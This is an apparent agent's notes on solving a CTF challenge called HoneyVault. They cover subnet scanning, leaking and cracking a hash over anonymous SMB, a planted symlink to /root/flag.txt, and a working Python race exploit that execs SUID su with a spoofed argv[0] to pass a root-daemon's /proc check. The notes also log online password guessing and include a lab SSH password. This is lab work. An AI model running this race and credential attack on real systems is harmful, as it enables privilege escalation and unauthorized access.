# HoneyVault — investigation notes

## SOLVED — flag: `avito{Un1X_SOCK3T_Race_4nD_5TICkY_SymLinK_3XP3rT}`

## Session 2d — the winning exploit: within-process euid-flip race (SUID `su` exec)

The final missing piece (coordinator's idea): `check_permissions` reads `/proc/{pid}/status`
and `/proc/{pid}/cmdline` **fresh, at check time** — it does not use the (unspoofable)
uid that `SO_PEERCRED` already handed back at `connect()` time. `get_peer_pid()` throws
that reliable uid away and keeps only the pid:
```python
def get_peer_pid(sock):
    ucred_size = struct.calcsize("3I")
    creds = sock.getsockopt(socket.SOL_SOCKET, socket.SO_PEERCRED, ucred_size)
    pid = struct.unpack("I", creds[:4])[0]   # only the pid is kept
    return pid
```
This means: the SAME pid that connected can change what `/proc/{pid}` reports about
itself *after* connecting, by calling `execve()` on a SUID-root binary — the process
keeps its pid (unlike a fork, which is what made the earlier "PID-reuse race" idea
impractical), but its `/proc/{pid}/status` `Uid:` effective field flips to `0`, and
its `/proc/{pid}/cmdline` becomes whatever `argv` we pass to `execve()`.

**Preconditions verified on `hv-storage-01` before attempting:**
```
$ cat /proc/self/status | grep -i nonewprivs
NoNewPrivs:	0                                    # SUID execution is NOT blocked

$ mount | grep 'on / '
overlay on / type overlay (rw,relatime,...)         # no "nosuid" flag

$ ls -la /usr/bin/su
-rwsr-xr-x 1 root root 72000 Nov 21  2024 /usr/bin/su   # genuinely SUID-root
```

**Wire protocol** — no need to reverse-engineer `managectl`'s binary; `handle_command`
in `processor.py` does trivial whitespace parsing (`raw.strip().split()`), so the raw
bytes `b"backup adminsecurity"` sent directly to the socket are the exact command.

**Exploit (Python, using `pty.fork()` so each attempt gets a real controlling
terminal for `su`'s password prompt to block on):**
```python
import socket, os, pty, time

def attempt():
    pid, fd = pty.fork()
    if pid == 0:
        try:
            sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            sock.connect("/var/run/managectl.sock")
            sock.send(b"backup adminsecurity")
            # argv[0]="managectl" -> /proc/{pid}/cmdline becomes "managectl backup adminsecurity",
            # satisfying TRUSTED_CMDLINE_REGEX; execve()-ing a SUID-root binary flips euid to 0.
            os.execv("/usr/bin/su", ["managectl", "backup", "adminsecurity"])
        except Exception:
            os._exit(1)
        os._exit(1)
    return pid

pids = [attempt() for _ in range(25)]   # fire many in parallel to win the race reliably
time.sleep(4)
for pid in pids:
    try: os.kill(pid, 9)
    except Exception: pass
    try: os.waitpid(pid, 0)
    except Exception: pass
```
`su` (invoked with no target user, defaulting to root) calls `getpass()` which opens
`/dev/tty` directly and blocks waiting for a password we never supply — each forked
attempt (via `pty.fork()`) gets its **own** pty as controlling terminal, so 25
independent attempts can all block simultaneously without fighting over one tty.
Since `processor.py`'s `main()` loop is single-threaded (`accept` → `get_peer_pid` →
`check_permissions` → `recv` → `handle_command` → respond → `close`, one connection
fully processed before the next `accept()`), and it has a `listen(5)` backlog, firing
many attempts nearly simultaneously all but guarantees at least one connection's
`check_permissions()` runs *after* that specific attempt's `execve()` has already
completed (euid=0, cmdline matches) but *before* `su` would ever exit (it just hangs).
One earlier single-attempt run lost the race (no archive appeared); 25 parallel
attempts won on the very next run.

**Gotcha**: `pids.max` cgroup = 50 for this container (same as the badger decoy). An
initial attempt at 60 parallel forks hit `BlockingIOError: [Errno 11] Resource
temporarily unavailable` from `os.fork()` — reduced to 25 (well under the ~41 headroom
above the ~9 baseline processes) and it completed cleanly (`DONE 25`).

**Result:**
```
$ ls -la /data/backup/
-rw-r--r-- 1 root root 10240 Jul 19 10:47 adminsecurity-20260719104734.tar

$ tar -tvf /data/backup/adminsecurity-20260719104734.tar
drwxrwxrwx operator/operator 0 2026-07-19 10:45 adminsecurity/
-rw------- dpetrova/dpetrova 50 2026-07-19 09:05 adminsecurity/flag_link   # tar -h dereferenced the symlink -> real file content, not a link

$ tar -xf ... ; cat adminsecurity/flag_link
avito{Un1X_SOCK3T_Race_4nD_5TICkY_SymLinK_3XP3rT}
```

### Full chain, end to end
1. Badger decoy maze on `honeyvault-6zjs6qon.avitoctf.ru` (session 1) — red herring by design.
2. Full-port-sweep the badger container's own `/26` (not just the gateway) to find the
   real storage host: `honeyvault-<hex>-storage`, SSH+Samba (22/139/445), `hv-storage-01`.
3. Anonymous SMB read of the `data` share leaks `admin/linux/remote-backup.sh` with
   a static MD5crypt hash for `operator`; cracked locally (hashcat + rockyou.txt) →
   `operator:monitoring` — this hash/password is identical across every fresh instance.
4. SSH as `operator@<storage-ip>` → world-readable `/opt/aegishive/processor.py`
   gives the full daemon source → the vulnerable `tar -chf ... -h` symlink-follow in
   `run_backup`, plus a real code bug (`ALLOWED_DIRECTORIES` missing a comma merges
   `"admin"`+`"security"` into `"adminsecurity"`, a whitelisted-but-nonexistent
   directory name we can freely create ourselves under the world-writable `/data` root).
5. `mkdir /data/adminsecurity; chmod 777; ln -s /root/flag.txt flag_link` — a fully
   attacker-controlled, whitelist-satisfying backup source.
6. `managectl` requires its connecting peer to show uid 0 in a **freshly re-read**
   `/proc/{pid}/status`/`cmdline` rather than trusting `SO_PEERCRED`'s own uid at
   connect time → win that TOCTOU by `connect()`+`send()` the raw command, then
   `execve()` a SUID-root binary (`/usr/bin/su`) in the *same* pid with `argv[0]`
   crafted to keep matching the cmdline regex → daemon's check now sees euid=0 →
   `tar -chf -h` runs as root → dereferences our symlink → flag lands in the archive
   → read it back over the same operator SSH session.

## Session 1/2 raw investigation notes (kept for reference)

## Session 2 update — found the real target, cracked creds, got full source, ID'd exact bug

Session 1 (below) correctly identified the badger jump-host as a decoy maze. The
coordinator's hint was right: there's a second host, **the actual storage/AegisHive
server**, reachable on the same per-session `/26` alongside the decoy gateway — you
just have to full-port-scan the *whole* subnet, not just the gateway IP.

### How to find it (repeat this each fresh connection — subnet is random per session)

```
sshpass -p '4LkbPt9qvNV6NZ76ooHArw' ssh badger@honeyvault-6zjs6qon.avitoctf.ru
sudo -n -s                                    # badger has full NOPASSWD sudo (see session 1)
apt-get update -qq && apt-get install -y nmap smbclient sshpass curl
ip -4 addr show eth0                          # get our own /26, e.g. 10.0.7.128/26
nmap -Pn -sS -T4 -p445 --min-rate 3000 <subnet>/26 -oG - | grep 445/open
```

The decoy gateway only ever has :22 open. The **real storage host** is a *different*
IP in the same `/26` and always resolves to a name like
`honeyvault-<hex>-storage.honeyvault-<hex>` with **22/tcp, 139/tcp, 445/tcp** open
(Samba). Confirmed across 3 independent sessions — pattern is 100% reliable:

```
Nmap scan report for honeyvault-22073913a841-storage.honeyvault-22073913a841 (10.0.7.130)
22/tcp  open  ssh   OpenSSH 9.2p1 Debian 2+deb12u10   (different build than the badger decoy)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
```

A full `-p-` scan of just that host shows **only** 22/139/445 — no other services,
no web panel, no "managectl" network port. Hostname is `hv-storage-01` (`/etc/motd`:
"HoneyVault Internal Storage").

### Anonymous SMB → credential leak → cracked password

`smbclient -L //<storage-ip>/ -N` (guest/anonymous, no creds needed) lists a `data`
share, world-readable. It contains a full internal fileshare tree:
`admin/`, `backup/`, `database/`, `important/`, `logs/`, `prod/`, `security/`, plus
`admin/linux/*.sh` ops scripts and `admin/backup/README.txt`.

**`admin/linux/remote-backup.sh`** (readable via anonymous SMB) leaks a credential hash:

```sh
REMOTE_HOST="${REMOTE_HOST:-hv-storage-01}"
REMOTE_USER="operator"
REMOTE_PASS_HASH='$1$lp9yekC1$OhCfwi88S6riHT9rovIqy0'
```

This exact hash+salt is **identical across every fresh instance** (confirmed on 3
separate sessions/IPs) — it's baked into the image, not randomized per-session, so
cracking it once is good forever. Local cracking *inside* the honeypot container is
unreliable (python3 `crypt` loops and even `john` get silently `Killed` — looks like
either a tight 128Mi cgroup or an active anti-bruteforce watchdog; a `bash` loop
calling `openssl passwd -1` per-candidate survives but is slow). **Crack it locally
on your own machine instead** — much faster and has zero risk of the honeypot killing
the process:

```
brew install hashcat            # or use existing rockyou.txt if you have one
hashcat -m 500 -a 0 hash.txt rockyou.txt -O
hashcat -m 500 hash.txt --show
```

Cracked in under a second against `rockyou.txt`:

```
operator : monitoring
```

`README.txt` on the share also documents the (buggy) directory whitelist:
> Allowed directories for AegisHive Processor backup: prod, admin, security,
> database, important, backup, logs

### SSH in as operator → full source of the AegisHive Processor

```
ssh operator@<storage-ip>          # password: monitoring
```

Banner: `Storage node hv-storage-01 | AegisHive Processor enabled`. `id`:
`uid=1000(operator) gid=37(operator) groups=37(operator)`.

`find / -iname '*managectl*' -o -iname '*aegishive*'` reveals:
- `/opt/aegishive/processor.py` — **world-readable**, the actual daemon source
- `/usr/local/sbin/managectl` — a Go-compiled CLI client (3.3MB) that talks to the daemon
- `/run/managectl.sock` (`= /var/run/managectl.sock`) — world-read-write (`srw-rw-rw-`) Unix socket

**Full source of `/opt/aegishive/processor.py` obtained** (207 lines) — this *is* the
AegisHive Processor. It's a Unix-socket daemon **run as root** (`ps auxww` shows
`root ... python3 /opt/aegishive/processor.py`), started directly by
`/entrypoint.sh` (`python3 /opt/aegishive/processor.py &`) — no cron, no systemd
timer, nothing else schedules it. Key excerpts:

```python
SOCKET_PATH = "/var/run/managectl.sock"
DATA_ROOT = Path("/data")

ALLOWED_DIRECTORIES = [
    "prod",
    "admin"          # <-- BUG: missing comma here
    "security",
    "database",
    "important",
    "backup",
    "logs"
]
# Python implicit string concat means this is actually:
# ["prod", "adminsecurity", "database", "important", "backup", "logs"]
# "admin" and "security" alone are NOT valid targets any more; "adminsecurity" is
# (a directory name nobody but us will ever legitimately create — see below)

TRUSTED_CMDLINE_REGEX = r"^(/usr/local/sbin/managectl|managectl) "

def check_permissions(pid):
    cmdline = get_process_cmdline(pid)          # reads /proc/{pid}/cmdline fresh
    if not re.match(TRUSTED_CMDLINE_REGEX, cmdline):
        return False, "untrusted process name"
    ruid, euid = get_process_uids(pid)           # reads /proc/{pid}/status fresh
    ...
    if rusername != "root" and eusername != "root":
        return False, f"uid {euid} ({eusername}) denied"
    return True, "ok"

def run_backup(directory):
    if directory not in ALLOWED_DIRECTORIES:
        return False, f"directory {directory} not allowed"
    source = DATA_ROOT / directory
    ...
    archive = backup_dir / f"{directory}-{timestamp}.tar"
    result = subprocess.run(
        ["tar", "-chf", str(archive), "-C", str(DATA_ROOT), directory], ...
    )                                             # <-- "-h" = dereference symlinks!
```

**This `tar -chf ... -h` is exactly the vulnerability the brief described**: `run_backup`
tars a whitelisted directory with `-h` (follow symlinks), running as root. A symlink
planted inside an allowed directory pointing at `/root/flag.txt` would have its
*contents* pulled into the resulting archive when backed up. `run_clear_logs` (deletes
`*.log` files) and `run_checksum` (`find -type f -exec sha256sum`, doesn't follow
symlinks — `find` without `-L` skips them) are lower-value siblings, not the
primary bug.

`managectl backup <dir>` / `clear-logs <dir>` / `checksum <dir>` is how you're
supposed to invoke it; confirmed by running the real client directly:

```
$ /usr/local/sbin/managectl backup important
managectl: uid 1000 (operator) denied
```

### The two blockers we hit (both confirmed precisely, not guessed)

**1. No writable whitelisted directory — solved via the `admin`/`security` typo bug.**
`find /data -writable` as operator returns *only* `/data` itself. Every real
whitelisted dir is `755`, owned by `root` (`important`, `backup`, `security`,
`admin`) or by `ksmith`/`dpetrova` (`prod`, `database`+`logs` respectively) — operator
owns none of them and isn't in their groups. Samba doesn't help either:
`/etc/samba/smb.conf` has `force user = fileshare` on the `[data]` share, so **every**
SMB session (guest or "authenticated" — literally any username/password combo maps to
guest via `map to guest = Bad User`, since none of the real Linux accounts are
registered Samba users) executes filesystem ops as `fileshare` (uid 999), which also
can't write into the named subdirs — only into `/data` itself
(`directory mask=1775`/`force directory mode=01777`, `/data` is `drwxrwxrwt`).

**BUT**: because of the missing-comma bug, `"adminsecurity"` (not `"admin"` or
`"security"` individually) is a legally whitelisted name that **doesn't correspond to
a real pre-existing directory** — so we can create it ourselves at the world-writable
`/data` root and it'll be entirely attacker-owned:

```
ssh operator@<storage-ip> 'mkdir -p /data/adminsecurity; chmod 777 /data/adminsecurity; \
   ln -sf /root/flag.txt /data/adminsecurity/flag_link; ls -la /data/adminsecurity'
```

This works — confirmed on two separate instances:
```
drwxrwxrwx 2 operator operator 23 ... .
lrwxrwxrwx 1 operator operator 14 ... flag_link -> /root/flag.txt
```
(Note: creating this via raw SMB `symlink` command fails — `NT_STATUS_ACCESS_DENIED`
or `NT_STATUS_NOT_A_REPARSE_POINT` depending on whether the server negotiates SMB1/
UNIX-extensions for that session, which varied between instances and the client
couldn't force SMB1: "No compatible protocol selected by server." **Skip SMB for the
symlink — just `ln -s` over plain SSH**, since `/data/adminsecurity` is a real local
path and SMB's `force user` restriction doesn't apply to a direct shell.)

**2. Can't get `run_backup` to actually execute — this is where we stopped.**
`check_permissions` requires the **connecting client process itself** to have
`ruid==0 or euid==0` (checked by re-reading `/proc/{pid}/status` fresh, keyed off the
PID from `SO_PEERCRED` — note the code discards the uid/gid fields SO_PEERCRED
already gives it and re-derives via `/proc`, which is a TOCTOU code-smell, but we
could not find a practical way to win that race: PID reuse on this box requires the
kernel's PID counter to wrap or a *specific* root process to be born on our exact
just-freed PID *and* have a cmdline starting with `managectl `, which nothing on the
box ever does naturally — no cron, no systemd, no timer, `ps auxww` never shows
anything but `docker-init`, `smbd`×3, `processor.py`, `sshd`, and our own session, for
the entire session lifetime). Operator has **no sudo** at all
(`sudo -n -l` → "a password is required"; `sudo -S -l` with the correct password →
"Sorry, user operator may not run sudo on hv-storage-01" — zero sudoers entries), no
SUID/SGID binaries beyond stock ones, no capabilities, no `docker.sock`, `PermitRootLogin
prohibit-password` blocks root SSH via password. Tried and failed:
password-guessing `ksmith`/`dpetrova` (own `prod` and `database`+`logs` respectively —
might have broader sudo, never got in), searching the whole storage-host filesystem
for a second embedded hash (only operator's exists), `pkexec`/`doas` (absent).

**Net result: the exact vulnerable code path and a valid attacker-writable,
whitelist-satisfying directory (`/data/adminsecurity`, with `flag_link -> /root/flag.txt`
already planted) are confirmed and ready — but nothing on this host ever actually
calls `managectl backup adminsecurity` as root to trigger the tar. If there's supposed
to be a legitimate scheduled/on-demand trigger (matching the brief's "scheduled
backups"), it isn't running anywhere observable inside this container during a
~15-20 min session window, and we found no way for operator to invoke it directly.**

### Session 2b — checked for an internal scheduler (coordinator hypothesis) — ruled out

Coordinator suggested `processor.py` might run backups on its own internal timer
(`while True: sleep(N)`, `threading.Timer`, `sched`, APScheduler) independent of the
managectl socket, since the brief mentions "scheduled backups." Verified this
precisely rather than re-guessing:

```
$ wc -l /opt/aegishive/processor.py
207 /opt/aegishive/processor.py

$ grep -n "sleep\|Timer\|while True\|schedule\|Thread\|interval\|monotonic\|APScheduler\|def " /opt/aegishive/processor.py
11:from time import monotonic, sleep
29:def get_peer_pid(sock):
36:def get_process_uids(pid):
49:def get_process_cmdline(pid):
57:def check_permissions(pid):
79:def run_backup(directory):
103:def run_clear_logs(directory):
120:def run_checksum(directory):
139:def handle_command(raw):
165:def main():
175:        while True:
```

That's **every** function in the file (9 total) and the **only** `while True` is the
blocking `server.accept()` loop inside `main()` (shown in full, lines 165-207 below) —
there is no thread, no timer, no second loop, nothing periodic. `from time import
monotonic, sleep` is imported but **never called anywhere** — a dead import (red
herring, or a leftover stub). `/opt/aegishive/` contains only `processor.py`
(confirmed via `ls -la /opt/aegishive/ /opt/` — no second script/scheduler file).
`/data/backup/` contains only the static `rotation.txt` doc, no `.tar` archives exist
yet (checked fresh on a new instance).

```python
def main():
    if Path(SOCKET_PATH).exists():
        os.unlink(SOCKET_PATH)
    server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    server.bind(SOCKET_PATH)
    os.chmod(SOCKET_PATH, 0o666)
    server.listen(5)
    try:
        while True:
            conn, _ = server.accept()
            try:
                pid = get_peer_pid(conn)
                allowed, msg = check_permissions(pid)
                data = conn.recv(4096)
                if not allowed:
                    conn.sendall(json.dumps({"ok": False, "error": msg}).encode())
                    continue
                if not data:
                    conn.sendall(json.dumps({"ok": False, "error": "no command"}).encode())
                    continue
                ok, result = handle_command(data.decode(errors="replace"))
                payload = {"ok": ok, "result": result}
                if not ok:
                    payload = {"ok": False, "error": result}
                conn.sendall(json.dumps(payload).encode())
            except Exception as exc:
                conn.sendall(json.dumps({"ok": False, "error": str(exc)}).encode())
            finally:
                conn.close()
    finally:
        server.close()
        if Path(SOCKET_PATH).exists():
            os.unlink(SOCKET_PATH)

if __name__ == "__main__":
    main()
```

**Conclusion: there is no passive/scheduled trigger to wait for.** The "scheduled
backups" language in the brief and in the flavor-text docs (`backup/rotation.txt`:
"Daily archives are kept for 14 days... Use AegisHive Processor for on-demand
snapshots") describes the fictional company's *policy*, not this simplified daemon's
*implementation* — the doc's own wording and `admin/runbook-deploy.txt`
("Create **on-demand** backup via AegisHive Processor (managectl)") both say
on-demand. The only way `run_backup`'s `tar -h` ever executes is via a client that
passes `check_permissions`.

**Re-examined the PID-reuse race (coordinator's fallback suggestion) — also not
practically exploitable, with reasoning:**

`check_permissions` does use a derived-PID `/proc` read rather than trusting
`SO_PEERCRED`'s own uid/gid fields directly (`get_peer_pid` only extracts the PID,
discarding the uid/gid the kernel already handed back — a genuine code smell/TOCTOU
shape). But for the race to help an attacker, a **single process** occupying our
just-vacated PID at check time would need to satisfy **both** checks simultaneously:
`/proc/{pid}/cmdline` starting with `managectl ` **and** `/proc/{pid}/status` Uid
line showing 0. No process on the box ever has a cmdline starting with `managectl ` except
one we spawn ourselves (as uid 1000) — root never execs it (no scheduler, confirmed
above), so there is no naturally-occurring root+managectl-cmdline process to race
into that PID. Racing a *different* root process (e.g. a forked `smbd`/`sshd` child,
which briefly runs as root before dropping privileges) would win the uid check but
fail the cmdline check (its cmdline is `smbd`/`sshd: ...`, not `managectl `). Separately,
modern Linux's PID allocator is a cyclic/incrementing counter specifically hardened
against immediate reuse of a just-freed low PID (this exact class of TOCTOU was a
known kernel security concern years ago) — so even ignoring the cmdline problem, making
a specific PID number get reused within microseconds isn't realistically achievable
from userspace on this kernel (`7.0.14-5-pve`, a current Proxmox build). Did not
attempt to implement this in code given both problems compound; flagging the reasoning
instead of burning session time on a near-zero-probability attempt.

Also checked for a companion scheduler binary or a third "orchestrator" host that
might legitimately SSH in as root and run `managectl` on a timer:
- `/usr/local/sbin/` contains **only** `managectl`; `/usr/local/bin/` is empty.
- No systemd (package install left inert `deb-systemd-helper-enabled` bookkeeping
  symlinks for `smbd`/`ssh`/`nmbd`/`samba-ad-dc`, but PID 1 is `docker-init`, nothing
  actually runs them).
- `hv-storage-01`'s own routing table (`/proc/net/route`, since `ip` isn't installed)
  shows the same single `/26` and same gateway as our badger decoy — no second route,
  no reachable third subnet. It's on the identical network segment, not a separate
  management VLAN.

### Session 2c — SUID / sudo / second-hash hunt (coordinator's checklist), exhaustive, all negative

**1. Is `managectl` SUID-root?** No.
```
$ ls -la /usr/local/sbin/managectl
-rwxr-xr-x 1 root root 3328054 Jul 15 22:51 /usr/local/sbin/managectl

$ stat /usr/local/sbin/managectl
  File: /usr/local/sbin/managectl
  Size: 3328054   	Blocks: 6504       IO Block: 4096   regular file
Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
```
Mode `0755`, no setuid bit (would be `4755`/`-rwsr-xr-x`). Owner root:root, but running it
as operator gives real **and** effective UID 1000, not 0.

**2. Which uid does the check compare — exact source, lines 36-78:**
```python
def get_process_uids(pid):
    try:
        with open(f"/proc/{pid}/status", "r") as f:
            for line in f:
                if match := re.match(r"^Uid:\s+(\d+)\s+(\d+)", line):
                    ruid = int(match.group(1))   # field 1 = Real UID
                    euid = int(match.group(2))   # field 2 = Effective UID
                    return ruid, euid
        return None, None
    except OSError:
        return None, None

def check_permissions(pid):
    cmdline = get_process_cmdline(pid)
    if not re.match(TRUSTED_CMDLINE_REGEX, cmdline):
        return False, "untrusted process name"
    ruid, euid = get_process_uids(pid)
    try:
        rusername = pwd.getpwuid(ruid).pw_name
    except KeyError:
        rusername = ""
    try:
        eusername = pwd.getpwuid(euid).pw_name
    except KeyError:
        eusername = ""
    if rusername != "root" and eusername != "root":
        return False, f"uid {euid} ({eusername}) denied"
    return True, "ok"
```
It parses **both** Real and Effective UID from `/proc/pid/status` and accepts if
**either** is root (`rusername != "root" and eusername != "root"` → deny, i.e. passes
if EITHER equals "root"). This confirms the coordinator's theory is exactly what the
code *would* accommodate — a SUID-root `managectl` (real=operator, effective=root)
would pass this check. It just isn't SUID on this box, so this exact door is shut.

**3. `sudo -l` as operator, with the correct password supplied:**
```
$ echo monitoring | sudo -S -l
[sudo] password for operator: Sorry, user operator may not run sudo on hv-storage-01.
```
Zero sudoers entries for operator. `/etc/sudoers.d/` contains **only** the stock
Debian `README` (`-r--r----- root root`, unreadable by operator anyway, and it's just
generic documentation, not a rule) — no custom sudoers file exists for *any* user on
this box, confirmed fresh on this instance.

**5. Exhaustive hunt for a second leaked hash / another way to reach root — all negative:**
- Full-filesystem grep for every common crypt hash prefix (`$1$ $5$ $6$ $y$ $2a$ $2b$`),
  excluding only `/proc /sys /usr /var` (which are pure stock-package noise):
  ```
  $ grep -rIlE '\$1\$|\$5\$|\$6\$|\$y\$|\$2b\$|\$2a\$' / --exclude-dir={proc,sys,usr,var} 2>/dev/null
  /data/admin/linux/remote-backup.sh
  ```
  **Only** operator's hash exists, anywhere. No second hash for `ksmith`/`dpetrova`.
- `/etc/shadow` is `-rw-r----- root shadow`, operator isn't in the `shadow` group →
  `Permission denied`, as expected (not a viable read).
- `/var/backups/` (Debian's usual passwd/shadow rotation drop) is **empty** — fresh
  container, nothing rotated in yet.
- Samba's own user DB: `/var/lib/samba/private/passdb.tdb` is `-rw------- root root`
  (600) — `pdbedit -L` as operator fails outright (`Failed to open/create TDB passwd`).
  Not readable, no NTLM hashes recoverable this way.
- Broad readable-file sweep for creds in configs/scripts:
  `find / -xdev -readable \( -iname '*.yml' -o -iname '*.yaml' -o -iname '*.conf' -o
  -iname '*.sh' -o -iname '*.cfg' -o -iname '*.ini' -o -iname '*.json' \) ...` — every
  hit is either a stock Debian config or a file we'd already read (the `admin/linux/*.sh`
  scripts, `smb.conf`). One new file worth checking, `/etc/ssh/sshd_config.d/challenge.conf`
  (clearly CTF-custom, not stock) — contents are mundane:
  ```
  PasswordAuthentication yes
  PermitRootLogin no
  UsePAM yes
  Banner /etc/issue.net
  ```
  No creds, no ForceCommand, no hints. `/entrypoint.sh` re-confirmed identical to
  earlier sessions (just `processor.py &`, `sshd`, `smbd` — no scheduler, no extra step).
- Anonymous SMB (`-N`) share enumeration re-confirmed via `smb.conf` directly (couldn't
  get `smbclient` installed this round — `apt-get install` inside the honeypot
  intermittently gets `Killed`, seemingly host-wide memory pressure unrelated to our
  own footprint, same as noted in session 2): `[global]`/`[data]` are the **only**
  two stanzas in `/etc/samba/smb.conf` — there is only one share (`data`) plus the
  implicit `IPC$`, nothing hidden.
- Live SSH password-guessed `ksmith` and `dpetrova` with ~40 role-themed candidates
  each (`deploy`, `platform`, `release`, `catalog`, `database`, `postgres`, `vacuum`,
  `replica`, their own usernames, etc.) — **zero hits**. Since no hash exists to crack
  offline, and a full rockyou-scale online guess (14M entries) is infeasible inside a
  ~15-20 min ephemeral session, this remains unresolved — but there is no evidence a
  simple guessable password exists for either account (unlike operator's, which had an
  explicit leaked hash to crack, not blind guessing).

**Conclusion of this pass: no SUID managectl, no sudo for operator, no sudoers.d rule
for anyone, no second leaked hash anywhere on the reachable filesystem, no accessible
Samba passdb. Every mechanism the coordinator's checklist named to get a root-uid peer
talking to the daemon is confirmed absent on this instance.** The `check_permissions`
code's own doubled real/effective check strongly suggests a SUID `managectl` (or an
equivalent root-invocation path) was intended somewhere in this challenge's design —
but it is not present in what this session can reach. Either it exists on a component
we still haven't located, or the "operator can only guess ksmith/dpetrova's password"
gap is one this session couldn't close in the time available (no offline crack
possible without their hash).

### Reusable facts for next session
- Password `monitoring` for `operator` is **stable across all instances** (static
  hash baked into the image) — no need to re-crack.
- `hv-analyst-01` (badger decoy) sessions and `hv-storage-01` sessions **both** have a
  TTL of roughly 15-25 minutes before the SSH connection is forcibly dropped
  ("Connection to ... closed" with no warning) — this is presumably the literal
  "cleanup of old data" AegisHive behavior mentioned in the brief, tearing down old
  ephemeral session containers. Any exploitation attempt needs to fit in that window;
  reconnecting gets a brand new random `/26` and a brand new storage-host IP (but same
  `operator`/`monitoring` credential and identical file layout/bug).
- Full source of `/opt/aegishive/processor.py` is above verbatim (well, the load-bearing
  excerpts) — re-fetch with `ssh operator@<storage-ip> cat /opt/aegishive/processor.py`
  if needed, it's world-readable.
- Next things worth trying if resumed: (a) a proper PID-reuse race exploit against
  `check_permissions` written to fire many rapid ephemeral connections while flooding
  sshd/smbd with new connections, timed precisely (a Python script using `os.fork`
  timed around `connect()` would be needed — not attempted, low confidence); (b)
  brute-forcing `ksmith`/`dpetrova` with a bigger wordlist (only ~15 manual guesses
  tried per account); (c) asking whether the CTF platform expects a *separate*,
  not-yet-found trigger (maybe a web hook, maybe something in `#hive-security`/
  `#hive-deployments` references in the doc files hint at an external system).

---

# Session 1 notes (superseded by session 2 above — kept for the decoy-maze analysis)

Status: **not solved in session 1**. Extensive enumeration completed; the "AegisHive Processor"
described in the brief was not found anywhere reachable from this vantage point.
Documenting everything ruled out so the next session doesn't repeat it.

## Access gotcha: the sshd is NOT a normal shell endpoint

```
sshpass -p '...' ssh ... badger@honeyvault-6zjs6qon.avitoctf.ru 'id'
  -> "Sorry, no commands allowed. Just 'ssh user@host' please."
```

The remote sshd has a `ForceCommand`-style wrapper that refuses any
`$SSH_ORIGINAL_COMMAND`. You can **only** get in via a genuine interactive
PTY session with no trailing command (`ssh user@host`, nothing after). That
means the usual `ssh host 'cmd'` one-liner from the task brief does not work —
had to drive the session with `expect` (script + password prompt + shell
prompt), one PTY per login. `scp`/non-interactive `ssh` are blocked the same way.

## What `badger@honeyvault-6zjs6qon.avitoctf.ru` actually is

Every single SSH connection to the public hostname spins up a **brand-new,
ephemeral Docker container** — not a persistent host. Confirmed by connecting
3+ times in a row and diffing `ip -4 addr show eth0`:

```
conn 1: inet 10.0.9.131/26 brd 10.0.9.191   (net 10.0.9.128/26)
conn 2: inet 10.0.9.67/26  brd 10.0.9.127   (net 10.0.9.64/26)
conn 3: inet 10.0.9.195/26 brd 10.0.9.255   (net 10.0.9.192/26)
```

Each connection gets its own throwaway `/26` Docker bridge network. Container
identity:

```
hostname: hv-analyst-01
/etc/motd: "HoneyVault Analyst Workstation — hv-analyst-01
            Corporate honey supply chain operations | Internal network only"
/etc/issue: "HoneyVault Corporation — Internal Analyst Workstation"
/etc/os-release: Debian GNU/Linux 12 (bookworm)
uname -a: Linux hv-analyst-01 7.0.14-5-pve #1 SMP ... (Proxmox VE kernel — host is Proxmox)
/proc/1/cmdline: /sbin/docker-init -- /entrypoint.sh /bin/bash
entrypoint.sh: su - badger   (root process just drops straight to badger)
```

lxcfs is mounted for `/proc/*` (loadavg, meminfo, stat, cpuinfo, etc.), so this
Docker container is itself running inside an (unprivileged, presumably LXC)
guest on a Proxmox host — nested virtualization.

## `id` / `sudo -l` — the "flaw" hands you root trivially, but there's no flag here

```
$ id
uid=1000(badger) gid=1000(badger) groups=1000(badger)

$ sudo -n -l
User badger may run the following commands on hv-analyst-01:
    (ALL) NOPASSWD: ALL

$ sudo -n cat /etc/sudoers.d/badger
badger ALL=(ALL) NOPASSWD:ALL
```

This is baked into the image on purpose (a real file in `/etc/sudoers.d/`,
not a misconfig we introduced). `sudo -n whoami` → `root` confirms it works.
But:

```
$ sudo -n cat /root/flag.txt
cat: /root/flag.txt: No such file or directory

$ sudo -n ls -la /root
total 8
drwx------ 2 root root  49 ... .
drwxr-xr-x 1 root root  25 ... ..
-rw-r--r-- 1 root root 571 ... .bashrc
-rw-r--r-- 1 root root 161 ... .profile

$ sudo -n grep -rIl "avito{" / --exclude-dir=proc --exclude-dir=sys
(nothing)

$ sudo -n find / -xdev -iname '*flag*'
(nothing but /proc/kpageflags-style noise, no real flag file)
```

**No `avito{...}` flag anywhere on this container's filesystem.** Root access
here is real but pointless — there's nothing to read.

## No AegisHive Processor anywhere on this box

- `find / -iname '*aegis*' -o -iname '*hive*'` → only Debian `debian-archive-*`
  keyring files (false-positive substring match), nothing custom.
- `/etc/cron.d`, `/etc/cron.daily` → only stock Debian entries
  (`e2scrub_all`, `apt-compat`, `dpkg`). No cron.hourly/weekly/monthly dirs exist.
- No systemd at all — PID 1 is `docker-init`, not `systemd`. `systemctl` /
  timers are meaningless here; nothing is "scheduled" inside this container.
- `ps auxww` shows exactly 5 processes total: `docker-init`, `su - badger`,
  `-bash`, and whatever command you're running. No backup/integrity/cleanup
  daemon, ever.
- Watched the box live for ~90s (9 rounds, 10s apart) diffing `ps auxww` and
  `find / -xdev -newer <marker>` — **zero external activity**. Nothing ever
  touches this container from outside once it's up. No AegisHive health-check,
  no backup agent, no integrity scanner.
- `/usr/local/bin`, `/usr/local/sbin` — empty. No custom scripts anywhere.
- No world-writable dirs except stock `/var/tmp`.
- No SSH keys, `.netrc`, `*.pem`, `*credential*`, `*.env` anywhere on the box.
- `env` / `/proc/1/environ` — empty, no hints.

Conclusion: whatever "AegisHive Processor" is, it is **not running inside, and
never touches, this ephemeral analyst container.**

## Network pivoting → a self-referential decoy maze, not a real target

nmap is pre-installed (along with python3, ssh-client) — clearly meant for
recon. `ip route` shows a `/26` bridge network with a gateway at `.193`
(pattern: gateway = network+1).

```
$ sudo -n nmap -Pn -sS -T4 -p22,80,443,8000,... 10.0.4.192/26
  -> every host in the /26 including .192 (net addr) and .255 (bcast) reports
     "filtered" on every port under -Pn (which always claims hosts "up" — not
     a real signal). Real ICMP-based discovery (-sn) finds only .193 alive.

